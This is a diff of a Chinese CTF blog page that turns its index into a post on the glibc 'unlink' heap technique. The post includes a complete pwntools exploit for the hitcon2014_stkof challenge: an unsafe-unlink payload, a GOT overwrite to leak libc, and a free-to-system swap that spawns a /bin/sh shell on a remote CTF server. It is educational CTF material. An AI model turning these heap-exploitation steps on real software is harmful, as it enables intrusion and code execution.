@@ -22,23 +22,38 @@
   <script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"hgg-bat.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
-<meta property="og:type" content="website">
-<meta property="og:title" content="Haruki">
-<meta property="og:url" content="https://hgg-bat.github.io/index.html">
+<meta name="description" content="Unlink ¶原理介绍 ¶unlink unlink其实就是把一个双链表中的空闲块给取出来，下面贴一张CTF-wiki上的原理图  一般来说就是将链表头处处于free状态的堆块从unsorted bin中脱离出来， 然后和物理相邻的堆块合并成新的大堆块（向前合并&#x2F;向后合并），最后再放入到 unsortedbin中 ¶unlink 源码阅读 1234567&#x2F;* at malloc.c _int_f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Unlink">
+<meta property="og:url" content="https://hgg-bat.github.io/2021/10/04/Unlink/index.html">
 <meta property="og:site_name" content="Haruki">
+<meta property="og:description" content="Unlink ¶原理介绍 ¶unlink unlink其实就是把一个双链表中的空闲块给取出来，下面贴一张CTF-wiki上的原理图  一般来说就是将链表头处处于free状态的堆块从unsorted bin中脱离出来， 然后和物理相邻的堆块合并成新的大堆块（向前合并&#x2F;向后合并），最后再放入到 unsortedbin中 ¶unlink 源码阅读 1234567&#x2F;* at malloc.c _int_f">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/sbd9qfl3g1fi9ty3umi38vot/38.png">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/be6e1prqqmpinvcx751v0xlp/39.png">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/ebbhnt7xr0p8sxtcrqky20zq/40.png">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/icy3zhxsx8ifxfjuc1eezl92/41.png">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/x6npivuk736g3yvmlb5dnw3k/42.png">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/ksgf2d6r9b7dr7d238ixo334/43.png">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/e5mmfpfyovlu8qpi6d4c8l4b/44.png">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/toot7r72l7m2qjirr2sj3sue/45.png">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/5w8ayit4cce7b0if21xr16st/46.png">
+<meta property="article:published_time" content="2021-10-04T06:43:42.000Z">
+<meta property="article:modified_time" content="2021-10-04T06:45:23.503Z">
 <meta property="article:author" content="haruki">
+<meta property="article:tag" content="笔记">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://static.zybuluo.com/hgggg/sbd9qfl3g1fi9ty3umi38vot/38.png">
 
 
-<link rel="canonical" href="https://hgg-bat.github.io/">
+<link rel="canonical" href="https://hgg-bat.github.io/2021/10/04/Unlink/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hgg-bat.github.io/2021/10/04/Unlink/","path":"2021/10/04/Unlink/","title":"Unlink"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Haruki</title>
+<title>Unlink | Haruki</title>
   
 
 
@@ -103,7 +118,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -116,6 +131,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">Unlink</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">原理介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink"><span class="nav-number">1.1.1.</span> <span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink-%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB"><span class="nav-number">1.1.2.</span> <span class="nav-text">unlink 源码阅读</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Unlink-%E7%9A%84%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8"><span class="nav-number">1.1.3.</span> <span class="nav-text">Unlink 的绕过和利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%97%E9%A2%98"><span class="nav-number">1.2.</span> <span class="nav-text">列题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ZJCTF-2019-EasyHeap"><span class="nav-number">1.2.1.</span> <span class="nav-text">ZJCTF 2019 EasyHeap</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IDA%E5%88%86%E6%9E%90"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">IDA分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hitcon2014-stkof"><span class="nav-number">1.2.2.</span> <span class="nav-text">hitcon2014_stkof</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-v2"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -187,16 +203,17 @@
 </noscript>
 
 
-    <div class="main-inner index posts-expand">
+    <div class="main-inner post posts-expand">
 
-    
+
+  
 
 
 <div class="post-block">
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://hgg-bat.github.io/2021/10/04/Unlink/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -209,9 +226,9 @@
       <meta itemprop="name" content="Haruki">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/10/04/Unlink/" class="post-title-link" itemprop="url">Unlink</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          Unlink
+        </h1>
 
         <div class="post-meta-container">
           <div class="post-meta">
@@ -244,7 +261,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1>Unlink</h1>
+        <h1>Unlink</h1>
 <h2 id="原理介绍"><a class="header-anchor" href="#原理介绍">¶</a>原理介绍</h2>
 <h3 id="unlink"><a class="header-anchor" href="#unlink">¶</a>unlink</h3>
 <p>unlink其实就是把一个双链表中的空闲块给取出来，下面贴一张CTF-wiki上的原理图</p>
@@ -319,7 +336,6 @@ P-&gt;bk = chunk - 0x10 = 0x602030
 <h4 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h4>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;stkof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;stkof&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26259</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">chunk = <span class="number">0x602150</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload =  p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(atoi_got)+p64(atoi_got)+p64(free_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(puts_plt)),p64(puts_plt))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(system)),p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-      
     </div>
 
     
@@ -327,435 +343,21 @@ P-&gt;bk = chunk - 0x10 = 0x602030
     
 
     <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
+          <div class="post-tags">
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fas fa-angle-double-up"></i> 笔记</a>
+          </div>
 
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://hgg-bat.github.io/2021/10/04/UAF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/tou.png">
-      <meta itemprop="name" content="haruki">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Haruki">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/10/04/UAF/" class="post-title-link" itemprop="url">UAF</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-10-04 14:12:24 / 修改时间：14:30:11" itemprop="dateCreated datePublished" datetime="2021-10-04T14:12:24+08:00">2021-10-04</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1>Use after free</h1>
-<h2 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h2>
-<pre><code>就是某块内存释放后，任能被用户使用，即存在野指针（一般是free后没有将指针置NULL）
-</code></pre>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/10/04/UAF/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
-    </div>
 
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://hgg-bat.github.io/2021/10/04/house-of-orange/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/tou.png">
-      <meta itemprop="name" content="haruki">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Haruki">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/10/04/house-of-orange/" class="post-title-link" itemprop="url">house_of_orange</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-10-04 13:43:30 / 修改时间：14:17:52" itemprop="dateCreated datePublished" datetime="2021-10-04T13:43:30+08:00">2021-10-04</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1>house of orange</h1>
-<h2 id="利用场景"><a class="header-anchor" href="#利用场景">¶</a>利用场景</h2>
-<pre><code>无free函数的堆溢出：没有free函数，或者是无法调用free函数free指定的堆块
-</code></pre>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/10/04/house-of-orange/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/10/04/UAF/" rel="prev" title="UAF">
+                  <i class="fa fa-chevron-left"></i> UAF
+                </a>
             </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://hgg-bat.github.io/2021/10/04/shellcode/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/tou.png">
-      <meta itemprop="name" content="haruki">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Haruki">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/10/04/shellcode/" class="post-title-link" itemprop="url">shellcode</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-10-04 10:51:34 / 修改时间：11:15:14" itemprop="dateCreated datePublished" datetime="2021-10-04T10:51:34+08:00">2021-10-04</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1>Shellcode</h1>
-<h3 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h3>
-<pre><code>在pwn中shellcode利用方式一般为触发中断（int 0x80 或 syscall）来进行系统调用
-system(&quot;/bin/sh&quot;)，实际上就是调用execve(&quot;/bin/sh&quot;,0,0)
-</code></pre>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/10/04/shellcode/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
+            <div class="post-nav-item">
             </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://hgg-bat.github.io/2021/10/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/tou.png">
-      <meta itemprop="name" content="haruki">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Haruki">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/10/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">pwn入门之环境搭建</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-10-04 10:32:23 / 修改时间：10:40:45" itemprop="dateCreated datePublished" datetime="2021-10-04T10:32:23+08:00">2021-10-04</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1>VMware下的ctf(pwn)入门环境搭建</h1>
-<h2 id="工具"><a class="header-anchor" href="#工具">¶</a>工具</h2>
-<p>VMware15</p>
-<p>unbuntu20.0镜像 下载地址：</p>
-<pre><code>http://mirrors.163.com/ubuntu-releases/20.04/
-</code></pre>
-<p>详情请见https://blog.csdn.net/weixin_44169941/article/details/109263134</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/10/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://hgg-bat.github.io/2021/10/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/tou.png">
-      <meta itemprop="name" content="haruki">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Haruki">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/10/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/" class="post-title-link" itemprop="url">古典密码</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-10-03 12:42:28 / 修改时间：17:37:47" itemprop="dateCreated datePublished" datetime="2021-10-03T12:42:28+08:00">2021-10-03</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Crypto/" itemprop="url" rel="index"><span itemprop="name">Crypto</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1>Crypto入门之古典篇</h1>
-<h2 id="1-古典密码概述"><a class="header-anchor" href="#1-古典密码概述">¶</a>1.古典密码概述</h2>
-<blockquote>
-<ul>
-<li>古典密码是密码学中的其中一个类型，其大部分加密方式都是利用<em><strong>替换式密码</strong></em> 或 <em><strong>移项式密码</strong></em>，有时则是两者的混合。其于历史中经常使用，但现代已经很少使用，大部分的已经不再使用了。一般而言，经典密码是基于一个拼音字母（像是A-Z）、动手操作或是简单的设备。它们可能是一种简单的密码法，以致于不可信赖的地步，特别是有新技术被发展出来后。</li>
-</ul>
-</blockquote>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/10/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
+          </div>
     </footer>
   </article>
 </div>
@@ -764,6 +366,8 @@ system(&quot;/bin/sh&quot;)，实际上就是调用execve(&quot;/bin/sh&quot;,0,
 
 
 
+
+    <div class="comments" id="lv-container" data-id="city" data-uid="MTAyMC81NDQxMC8zMDg4MQ=="></div>
 </div>
   </main>
 
